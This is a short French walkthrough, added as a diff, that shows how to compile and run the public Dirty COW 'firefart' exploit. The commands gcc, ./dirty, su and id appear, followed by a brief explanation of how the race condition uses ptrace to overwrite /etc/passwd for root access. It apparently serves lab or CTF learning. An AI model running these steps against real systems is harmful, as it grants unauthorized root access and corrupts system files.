@@ -1,0 +1,16 @@
+Ici nous allons utiliser un script dirty cow : firefart
+Utiliser l'exploit n'a rien de bien complique:
+> gcc -pthread dirty.c -o dirty -lcrypt
+> ./dirty password
+wait ...
+... wait ...
+interupt
+> su firefart
+password
+> id
+
+Du coup petite explication de l'exploit:
+L'exploit va utiliser ptrace qui a la base est un outil de debug, mais qui va pouvoir faire quelques petites choses interessante
+Il a par exemple le droit de copier de la memoire a une adresse specifique utilise par un process
+On a donc ouvert le fichier /etc/passwd mais en faisant un certain nombre d'essai (il s'agit d'une race condition, elle ne marche pas a tous les coups),
+on arrivera a ecrire notre nouvelle ligne dans /etc/passwd 4 octet par 4 octets
